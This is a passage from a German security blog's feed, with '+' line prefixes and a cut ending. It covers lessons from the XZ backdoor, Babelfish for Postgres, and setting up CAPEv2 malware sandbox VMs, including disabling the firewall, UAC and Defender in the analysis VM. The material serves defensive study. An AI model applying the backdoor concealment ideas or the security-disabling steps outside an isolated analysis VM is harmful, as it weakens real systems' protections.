+Testfile, mit dem &amp;ldquo;Aktivierungscode&amp;rdquo; nicht in der Versionskontrolle enthalten&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;. Ebenso auffällig ist, dass die
+Backdoor/RCE einen bestimmtes SSH-Zertifikat benötigt, um aktiviert zu werden, und die Payload innerhalb dieses
+Zertifikats (genauer, dem CA-Teil) enthalten ist, wo binäre Daten kaum auffallen &lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt; . Später ist ebenfalls aufgefallen, dass
+der Name &amp;ldquo;Jia Cheong Tan&amp;rdquo; zwar chinesisch klingt, aber eine Mischung aus Kantonesisch und Mandarin ist&lt;sup id=&#34;fnref:3&#34;&gt;&lt;a href=&#34;#fn:3&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;3&lt;/a&gt;&lt;/sup&gt;. Aus der
+Analyse der Git commit logs geht ebenfalls heraus, dass die Commits zu UrzeitenSch gemacht wurden, die für China eher
+unüblich sind&lt;sup id=&#34;fnref:4&#34;&gt;&lt;a href=&#34;#fn:4&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;4&lt;/a&gt;&lt;/sup&gt;. Die Vermutung liegt also nahe, dass die tatsächliche Person (oder Personen?) hinter der Backdoor
+vermutlich eher in Osteuropa oder dem Nahen Osten (UTC+2/3) zu finden ist.&lt;/p&gt;
+&lt;h2 id=&#34;4-lessons-learned&#34;&gt;4. Lessons Learned&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Die XZ-Backdoor ist eine seltene Möglichkeit, in die Vorgehensweise und den Code von möglichen staatlichen Akteuren oder
+anderen APTs&lt;sup id=&#34;fnref:5&#34;&gt;&lt;a href=&#34;#fn:5&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;5&lt;/a&gt;&lt;/sup&gt; hineinsehen zu können und sein Sicherheitsvorgehen dahingehend zu optimieren.&lt;/li&gt;
+&lt;li&gt;Interessant ist, dass die Backdoor nicht im eigentlichen Source Code des Git trees enthalten war,
+sondern in binären Testdateien (für deren
+Generierung kein Sourcecode verfügbar war) versteckt war und der Code zur Aktivierung nur im Release-Tarball enthalten
+war, nicht jedoch im Git tree, was in Kombination dafür spricht, dass der Urheber der Sicherheitslücke versucht hat, so
+wenig &amp;ldquo;permanente&amp;rdquo; Spuren wie möglich zu hinterlassen, die von (automatischer) Code-Analyse einfach gefunden worden
+wären.&lt;/li&gt;
+&lt;li&gt;Ebenfalls stellt sich die Frage, in wie vielen anderen Projekten (Open Source wie proprietär), ähnliche Angriffe
+versucht wurden und vielleicht sogar erfolgreich waren. In Zukunft werde zumindest ich deutlich mehr Vorsicht gegenüber
+binären Dateien in Source Code walten lassen. Möglich wäre z.B., dass eine Backdoor in einem binary blob Treiber
+enthalten ist, der von einem Hardware-Hersteller veröffentlicht wird. Sollte dieser Treiber statisch (also nicht als
+Kernel Modul) in den Kernel compiliert werden, wäre es möglich, diese Schwachstelle auf Millionen von Geräten zu
+installieren.&lt;/li&gt;
+&lt;li&gt;Ähnliches Vorgehen in proprietärer Software (z.B. Microsoft Exchange) dürfte in ähnlicher Weise umsetzbar sein. Das
+Plazieren eines Maulwurfs in einem solchen Entwicklerteam könnte sogar einfacher sein, da das Vertrauen einem anderen
+Mitarbeiter gegenüber deutlich schneller anwächst als einem Fremden gegenüber.&lt;sup id=&#34;fnref:6&#34;&gt;&lt;a href=&#34;#fn:6&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;6&lt;/a&gt;&lt;/sup&gt;&lt;/li&gt;
+&lt;li&gt;Mobbing und Burnout können ein echtes Sicherheitsrisiko sein. &amp;ldquo;Jia Tan&amp;rdquo; wäre vermutlich nie in diese Position gekommen,
+wäre der eigentliche Maintainer und Entwickler von xz nicht von Burnout betroffen und effektiv dazu gemobbt worden,
+&amp;ldquo;Jia Tan&amp;rdquo; zum Co-Maintainer und sogar primären Maintainer zu machen.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://gynvael.coldwind.pl/?id=782&#34;&gt;https://gynvael.coldwind.pl/?id=782&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:2&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b&#34;&gt;https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:3&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://boehs.org/node/everything-i-know-about-the-xz-backdoor&#34;&gt;https://boehs.org/node/everything-i-know-about-the-xz-backdoor&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:3&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:4&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and&#34;&gt;https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:4&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:5&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Advanced_persistent_threat&#34;&gt;https://en.wikipedia.org/wiki/Advanced_persistent_threat&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:5&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:6&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://infosec.exchange/@SecureOwl/112181879860988729&#34;&gt;https://infosec.exchange/@SecureOwl/112181879860988729&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:6&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Babelfish für Postgresql - MSSQL-Kompatibilität für Postgres</title>
+      <link>https://www.jmbit.de/blog/2024-03-16-babelfish-psql/</link>
+      <pubDate>Sat, 16 Mar 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.jmbit.de/blog/2024-03-16-babelfish-psql/</guid>
+      <description>Babelfish ist ein Projekt, das die Verwendung von Postgresql für Software erlaubt, die eigentlich für MSSQL (Microsoft SQL Server) geschrieben wurden. Dies erlaubt zum einen das einsparen von Lizenzkosten, die bei MSSQL, insbesondere für hochverfügbare Umgebungen, leicht sehr hoch werden können, zum anderen aber auch, das größere und modernere Postgres-Ökosystem verwenden zu können.
+Was ist Babelfish? Ähnlich wie sein Namensvorbild, ist Babelfish kein migrationstool o.ä., sondern eine Kompatibilitäts/Übersetzungsschicht, vergleichbar etwa mit Wine.</description>
+      <content>&lt;p&gt;&lt;a href=&#34;https://babelfishpg.org/&#34;&gt;Babelfish&lt;/a&gt; ist ein Projekt, das die Verwendung von Postgresql für Software erlaubt, die
+eigentlich für MSSQL (Microsoft SQL Server) geschrieben wurden. Dies erlaubt zum einen das einsparen von Lizenzkosten,
+die bei MSSQL, insbesondere für hochverfügbare Umgebungen, leicht sehr hoch werden können, zum anderen aber auch, das
+größere und modernere Postgres-Ökosystem verwenden zu können.&lt;/p&gt;
+&lt;h2 id=&#34;was-ist-babelfish&#34;&gt;Was ist Babelfish?&lt;/h2&gt;
+&lt;p&gt;Ähnlich wie sein &lt;a href=&#34;https://de.wikipedia.org/wiki/Babelfisch&#34;&gt;Namensvorbild&lt;/a&gt;, ist Babelfish kein migrationstool o.ä.,
+sondern eine Kompatibilitäts/Übersetzungsschicht, vergleichbar etwa mit &lt;a href=&#34;https://www.winehq.org/&#34;&gt;Wine&lt;/a&gt;. Im Optimalfall
+kann man also eine Applikation, die eine MSSQL-Datenbank benötigt, mit einem Postgres-DB-Server betreiben, ohne die
+Applikation umbauen zu müssen. Das kann einerseits für eine vereinfachte Migration sein, andererseits aber auch für die
+Ablösung bestehender MSSQL-Server durch Postgres-Server.&lt;/p&gt;
+&lt;h2 id=&#34;was-ist-babelfish-nicht&#34;&gt;Was ist Babelfish nicht?&lt;/h2&gt;
+&lt;p&gt;Babelfish ist aktuell NICHT 100% MSSQL-Kompatibel. Es fehlen vor allem Funktionalitäten, die mit dem DB-Server selbst zu
+tun haben (bestimmte tabellen in Systemdatenbanken, manche Stored Procedures&amp;hellip;) oder mit dem darunterliegenden OS
+(CLR/Assebly Module). Dadurch ist Babelfish nicht plug&amp;amp;play, sollte die Applikation eher exotische Funktionen verwenden.
+Ebenfalls sollte es nicht als einfaches Drop-In-Replacement gesehen werden.&lt;/p&gt;
+&lt;h2 id=&#34;wie-finde-ich-heraus-ob-babelfish-für-meine-anwendung-funktioniert&#34;&gt;Wie finde ich heraus, ob Babelfish für meine Anwendung funktioniert?&lt;/h2&gt;
+&lt;p&gt;Es gibt mehrere Ressourcen, mit deren Hilfe es möglich ist, die Kompatibilität mit Babelfish zu testen:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Dokumentation: Es gibt sowohl von AWS für ihre SAAS-Version
+&lt;a href=&#34;https://docs.aws.amazon.com/AmazonRDS/latest/AuroraUserGuide/babelfish-compatibility.tsql.limitations-unsupported.html&#34;&gt;Informationen&lt;/a&gt;,
+als auch vom &lt;a href=&#34;https://babelfishpg.org/docs/limitations/limitations-of-babelfish/&#34;&gt;Babelfish Projekt selbst&lt;/a&gt;.
+Letztere tendieren leider dazu, etwas veraltet zu sein.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/babelfish-for-postgresql/babelfish_compass&#34;&gt;Babelfish-Compass&lt;/a&gt;: Compass ist ein Tool, mit dessen
+Hilfe es möglich ist, die Kompatibilität sowohl von Skripten, als auch Software und bestehender Datenbanken zu
+messen.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;welche-alternativen-gibt-es&#34;&gt;Welche Alternativen gibt es?&lt;/h2&gt;
+&lt;p&gt;Sollte es nicht möglich sein, eine Applikation von MSSQL auf Babelfish &amp;amp; Postgres zu migrieren, gibt es noch ein paar
+andere Möglichkeiten, die Datenbank zu modernisieren. Seit Version 2019 kann MSSQL auch unter Linux betrieben werden,
+was abgesehen von der Möglichkeit, Windows Lizenzen einzusparen, die Möglichkeit bietet, die Server mit den üblichen
+Verwaltungstools zu verwalten, sowie Dateisysteme und Storage-Backends zu verwenden, die Windows nicht unterstützt.
+Andererseits erlaubt es auch den Betrieb der Datenbank auf einem Kubernetes-Cluster, das dann Skalierung, Resilienz und
+Verwaltung der DB-Engine übernimmt.&lt;/p&gt;
+&lt;p&gt;Sollten Sie nach dieser Einleitung weitere Fragen zu Babelfish haben, können Sie mich gerne kontaktieren.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>CAPEv2 Sandbox Teil 2: Einrichtung der VM(s)</title>
+      <link>https://www.jmbit.de/blog/2023-12-20-cape-part2/</link>
+      <pubDate>Wed, 20 Dec 2023 14:41:12 +0100</pubDate>
+      
+      <guid>https://www.jmbit.de/blog/2023-12-20-cape-part2/</guid>
+      <description>Nach der Installation der Sandbox-Umgebung an sich kann man an die Erstellung und Installation der VMs gehen. Hier werde ich als Beispiel die Installation einer Windows 7 64bit-VM inkl. Microsoft Office 2010 (32bit) durchführen. Letztendlich gibt es jedoch keinen großen Unterschied zwischen den unterstützten Gast-Betriebssystemen (Windows 7+, MacOS oder diverse Linux-Distributionen), es ist jedoch je nach Platform mehr oder weniger Aufwand (Bei Windows 10+ muss Defender komplett deaktiviert werden und es empfiehlt sich den Großteil der Bloatware zu deinstallieren um die Hardwareanforderungen zu verringern).</description>
+      <content>&lt;p&gt;Nach der Installation der Sandbox-Umgebung an sich kann man an die Erstellung und Installation der VMs gehen.
+Hier werde ich als Beispiel die Installation einer Windows 7 64bit-VM inkl. Microsoft Office 2010 (32bit) durchführen.
+Letztendlich gibt es jedoch keinen großen Unterschied zwischen den unterstützten Gast-Betriebssystemen (Windows 7+,
+MacOS oder diverse Linux-Distributionen), es ist jedoch je nach Platform mehr oder weniger Aufwand (Bei Windows 10+
+muss Defender komplett deaktiviert werden und es empfiehlt sich den Großteil der Bloatware zu deinstallieren um die
+Hardwareanforderungen zu verringern).&lt;/p&gt;
+&lt;p&gt;Hier ist ein Beispiel der Software, die ich auf meine Windows 7-VM installiere. Der Einfachheit halber packe ich die
+Dateien alle zusammen in eine ISO-Datei (mithilfe von mkisofs), die ich dann an die VM anhängen kann. Ebenfalls
+interessant ist es, wenn man zusätzlich zu Software auch Dokumente und Bilder auf der VM ablegt, um eventuelles
+Ransomware-Verhalten besser beobachten zu können. Das Skript &lt;code&gt;disable_win7noise.bat&lt;/code&gt; wird mit CAPEv2 ausgeliefert.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;~ $ ls isos/win7cuckoo 
+7z2301-x64.exe               OpenJDK8U-jre_x64_windows_hotspot_8u392b08.msi  windows6.1-kb2533552-x64_0ba5ac38d4e1c9588a1e53ad390d23c1e4ecd04d.msu
+agent.py                     python-3.8.10.exe                               windows6.1-kb2533623-x64.msu
+disable_win7noise.bat        VC_redist.x64.exe                               windows6.1-kb976932-x64_74865ef2562006e51d7f9333b4a8d45b7a749dab.exe
+ndp48-x86-x64-allos-enu.exe  VC_redist.x86.exe                               Win_x64_576753_mini_installer.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;einstellungen-im-betriebssystem&#34;&gt;Einstellungen im Betriebssystem&lt;/h2&gt;
+&lt;p&gt;Aufgrund der Weise, wie CAPEv2 funktioniert, muss der VM eine statische IP-Addresse vergeben werden:&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Win7 statische IP vergeben&#34; src=&#34;https://www.jmbit.de/img/blog/2023-cape/win7-static-ip.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Diese IP-Addresse muss dann später in der &lt;code&gt;/opt/CAPEv2/conf/kvm.conf&lt;/code&gt; eingetragen werden.
+Ebenfalls sollten UAC und die Windows Firewall deaktiviert werden:&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Windows 7 Control Panel deaktivierte Firewall&#34; src=&#34;https://www.jmbit.de/img/blog/2023-cape/win7_firew.png&#34;&gt;
+&lt;img alt=&#34;Windows 7 Control Panel deaktivierte User Account Control&#34; src=&#34;https://www.jmbit.de/img/blog/2023-cape/win7_uac.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In der Regel setze ich die Auflösung der VM auch hoch, entweder auf 1280x768 oder 1920x1080. Für die Aktivierung von
+Windows 7 und Office 2010 muss leider - sofern man keinen KMS Server besitzt, den man diesen VMs aussetzen möchte - die
+Telefonische Aktivierung verwendet werden.&lt;/p&gt;
+&lt;p&gt;Bei der Installation von Python und MS-Office ist es wichtig, die 32-Bit-Variante zu verwenden, da die 64Bit-Variante
+leider nicht mit allen Analyseverfahren kompatibel ist.&lt;/p&gt;
+&lt;h2 id=&#34;agent-installieren&#34;&gt;Agent installieren&lt;/h2&gt;
+&lt;p&gt;Sobald Python installiert (am besten im PATH registrieren und für alle Benutzer installieren)
+ist sollte noch Pillow nachinstalliert werden:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; py -m pip install --upgrade pip
+&amp;gt; py -m pip install Pillow==9.5.0
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;agent.py&lt;/code&gt; ist der Teil der Software, der in der VM mitläuft um die Aufgaben dort auszuführen. Dieser Datei gibt man
+unter Windows 7 einen Unauffälligen Namen und legt sie unter
+&lt;code&gt;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&lt;/code&gt; ab, unter Linux lässt man sie entweder von systemd oder
+cron beim (re)boot starten. Unter Windows 10/11 muss die Datei an einem anderen Ort abgelegt werden und dann ein
+Scheduled Task erstellt werden, der dieses Skript beim Boot als Admin ausführt. Langfristig habe ich geplant, den Agent
+und seine Dependencies mit PyInstaller zusammenzufassen.&lt;/p&gt;
+&lt;p&gt;Falls die Installation des Agents erfolgreich war, kann man nun auf port 8000 der VM einen JSON-String sehen:&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Terminal Fenster mit CURL und JSON-Antwort&#34; src=&#34;https://www.jmbit.de/img/blog/2023-cape/win7-agent-json.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;konfiguration-der-vm-in-virt-managerlibvirt&#34;&gt;Konfiguration der VM in virt-manager/libvirt&lt;/h2&gt;
+&lt;p&gt;Letztendlich ist noch zu empfehlen die Grafik auf VNC umzustellen von Spice und dadurch nicht mehr benötigte Geräte
+zu entfernen. Dabei muss jedoch ein teil des XML-Codes der VM bearbeitet werden.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Displayart von SPICE auf VNC ändern&#34; src=&#34;https://www.jmbit.de/img/blog/2023-cape/SPICE2VNC.png&#34;&gt;
+&lt;img alt=&#34;SPICE-Audio-Zeile löschen&#34; src=&#34;https://www.jmbit.de/img/blog/2023-cape/SPICE-Audio.png&#34;&gt;
+&lt;em&gt;hierfür muss ggf. in den Einstellungen von Virt-Manager der &amp;ldquo;Advanced&amp;rdquo;-Modus aktiviert werden.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Diese Änderungen machen es möglich, später die Liveansicht im Webbrowser zu verwenden.&lt;/p&gt;
+&lt;p&gt;Sobald die VM fertig konfiguriert ist und der Agent erreichbar ist, muss nur noch im laufenden Zustand ein Snapshot
+erstellt werden.&lt;/p&gt;
+&lt;h2 id=&#34;vm-in-cape-bekanntmachen&#34;&gt;VM in CAPE bekanntmachen&lt;/h2&gt;
+&lt;p&gt;Nun muss noch die &lt;code&gt;/opt/CAPEv2/conf/kvm.conf&lt;/code&gt;-Datei angepasst werden. In diesem Fall müssen primär &amp;ldquo;cuckoo1&amp;rdquo; durch den
+Namen der VM ersetzt werden (z.B. win7) und die eingetragene IP-Adresse sowie das Netzwerk angepasst werden.
+In meinem Fall:
+- cuckoo1 &amp;gt; win7
+- 192.168.122.105 &amp;gt; 192.168.1.188
+- virbr0 &amp;gt; virbr1
+Dazu müssen noch die Tags hinzugefügt werden, z.B. &lt;code&gt;tags = win7,msoffice2010&lt;/code&gt;. Bei Windows-Maschinen muss (Wie in der
+Config-File beschrieben), einer der Tags &lt;code&gt;winxp,win7,win10,win11&lt;/code&gt; hinzugefügt werden. Nun sollte CAPEv2 die VM kennen. Um
+dies zu testen, sollte man am besten das System noch einmal neu starten, oder alle CAPE-Dienste neu starten.&lt;/p&gt;
+&lt;p&gt;Sollte der Dienst weiterhin nicht starten, kann man mit&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo -u cape bash -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cd /opt/CAPEv2 &amp;amp;&amp;amp;poetry run python /opt/CAPEv2/cuckoo.py&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;versuchen, das Programm manuell zu starten und eventuelle Fehler zu debuggen. Hier wird einem auch angezeigt, welche
+Python-Pakete noch fehlen und ggf. nachinstalliert werden müssen. Dabei sollte beachtet werden, dass diese immer als
+&lt;code&gt;cape&lt;/code&gt; im &lt;code&gt;/opt/CAPEv2/&lt;/code&gt;-Verzeichnis ausgeführt werden müssen.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@cape:~# systemctl status cape
+● cape.service - CAPE
+     Loaded: loaded (/lib/systemd/system/cape.service; enabled; vendor preset: enabled)
+     Active: active (running) since Wed 2023-12-27 17:23:29 UTC; 4s ago
+       Docs: https://github.com/kevoreilly/CAPEv2
+   Main PID: 3515 (python)
+      Tasks: 1 (limit: 38183)
+     Memory: 99.4M
+        CPU: 4.149s
+     CGroup: /system.slice/cape.service
+             └─3515 /home/cape/.cache/pypoetry/virtualenvs/capev2-t2x27zRb-py3.10/bin/python cuckoo&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;reporting-konfiguration&#34;&gt;Reporting-Konfiguration&lt;/h2&gt;
+&lt;p&gt;In der Datei &lt;code&gt;/opt/CAPEv2/conf/reporting.conf&lt;/code&gt; muss zumindest das Reporting nach MongoDB oder Elasticsearch aktiviert
+werden, andere Reports können aber ebenfalls aktiviert werden (z.B. PDF-Reports, die einfach weiterzugeben sind).
+Nach dieser Änderung muss noch einmal der &lt;code&gt;cape&lt;/code&gt;-Dienst neu gestartet werden (&lt;code&gt;systemctl restart cape&lt;/code&gt;).&lt;/p&gt;
+&lt;h2 id=&#34;cape-web-ui&#34;&gt;CAPE-Web-UI&lt;/h2&gt;
+&lt;p&gt;Nun sollte hoffentlich die Web-UI erreichbar sein und funktionieren:&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;CAPEv2 Dashboard&#34; src=&#34;https://www.jmbit.de/img/blog/2023-cape/cape_dashboard.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Jetzt kann man unter &amp;ldquo;Submit&amp;rdquo; eine Testdatei hochladen, die analysiert werden soll.
+Dann heißt es nur noch warten und hoffen, dass der Report erfolgreich generiert wird und keine Fehler geworfen werden.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>CAPEv2 Sandbox Teil 1</title>
+      <link>https://www.jmbit.de/blog/2023-11-30-capev2-sandbox/</link>
+      <pubDate>Thu, 30 Nov 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.jmbit.de/blog/2023-11-30-capev2-sandbox/</guid>
+      <description>Die CAPEv2-Sandbox-Umgebung ist sehr nützlich für die Analyse von Malware, da man hier die Malware in einer kontrollierten Umgebung &amp;ldquo;zünden&amp;rdquo; kann und eine genaue Protokollierung hat. Die Installation und konfiguration von CAPE ist jedoch nicht besonders einfach. Dieser Blogeintrag kann Ihnen hoffentlich als Einstieg dienen um sich eine solche Umgebung aufzubauen. Bei Rückfragen und weiterführenden Themen stehe ich gerne zur Verfügung.
+Basis Die Installations- und Konfigurationsskripte von CAPEv2 sind auf Ubuntu 22.</description>
+      <content>&lt;p&gt;Die CAPEv2-Sandbox-Umgebung ist sehr nützlich für die Analyse von Malware, da man hier die Malware in einer
+kontrollierten Umgebung &amp;ldquo;zünden&amp;rdquo; kann und eine genaue Protokollierung hat. Die Installation und konfiguration von CAPE
+ist jedoch nicht besonders einfach. Dieser Blogeintrag kann Ihnen hoffentlich als Einstieg dienen um sich eine
+solche Umgebung aufzubauen. Bei Rückfragen und weiterführenden Themen stehe ich gerne zur Verfügung.&lt;/p&gt;
+&lt;h2 id=&#34;basis&#34;&gt;Basis&lt;/h2&gt;
+&lt;p&gt;Die Installations- und Konfigurationsskripte von CAPEv2 sind auf Ubuntu 22.04 optimiert. Eine Installation
+unter Debian ist ebenfalls mit vergleichsweise wenig Änderungen möglich. Für andere Distributionen und MacOS sind
+deutlich weiterführendere Änderungen notwendig, eine Installation unter Microsoft Windows ist nicht möglich.
+Bei der Installation in einer Virtuellen Maschine muss &amp;ldquo;Nesting&amp;rdquo;-Aktiviert sein. Die Hardware-Anforderungen sind
+stark von der geplanten Art und Anzahl von VMs ab. Es ist sinnvoll, mindestens 4 GB für OS und Applikation
+einzurechnen, plus den Hardwareressourcen die für die maximale Anzahl an gleichzeitig laufenden VMs benötigt werden.&lt;/p&gt;
+&lt;h2 id=&#34;capev2-download-und-vorbereitungen&#34;&gt;CAPEv2 Download und Vorbereitungen:&lt;/h2&gt;
+&lt;p&gt;CAPEv2 herunterladen:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo git clone https://github.com/kevoreilly/CAPEv2 /opt/CAPEv2
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Sobald man CAPEv2 heruntergeladen hat, sollte man das Skript &lt;code&gt;/opt/CAPEv2/installer/kvm-qemu.sh&lt;/code&gt; anpassen.
+Die grundsätzliche Anleitung dafür steht in diesem Skript, für den Austausch der &amp;lt;WOOT&amp;gt;-Einträge für die
+Hardware IDs ist die Website der UEFI alliance mit der &lt;a href=&#34;https://uefi.org/ACPI_ID_List&#34;&gt;Liste der ACPI-IDs&lt;/a&gt;.
+Für Testinstallationen ist es aber auch möglich, zufällige 4 Zeichen zu nutzen.
+sobald dieses Skript angepasst wurde, kann es ausgeführt werden.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd /opt/CAPEv2/installer/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ./kvm-qemu.sh all yourusername | tee kvm-qemu-all.log
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# optional&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ./kvm-qemu.sh virt-manager yourusername | tee kvm-qemu-virt-manager.log
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Hierbei sollte besonders darauf geachtet werden, dass APT auch alle Pakete installieren kann.
+Nachdem die installation erfolgreich war, ist es sinnvoll, das System neu zu starten.&lt;/p&gt;
+&lt;h2 id=&#34;cape-installieren&#34;&gt;CAPE installieren&lt;/h2&gt;
+&lt;p&gt;für die Installation von CAPEv2 führt man die folgenden Befehle aus:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd /opt/CAPEv2/installer
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ./cape.sh all | tee cape-all.log
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reboot now
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd /opt/CAPEv2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo -u cape poetry install
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;poetry env list
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo -u cape poetry run pip install -r extra/optional_dependencies.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reboot now
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;internet-via-cloudflare-vpn&#34;&gt;Internet via Cloudflare-VPN&lt;/h2&gt;
+&lt;p&gt;Es ist sinnvoll, den Internet-Zugang der VMs über einen VPN laufen zu lassen und nicht über das eigene (lokale) Netz.
+hierfür können diverse VPN-Anbieter verwendet werden, in diesem Fall nutze ich der Einfachheit halber Cloudflare Warp
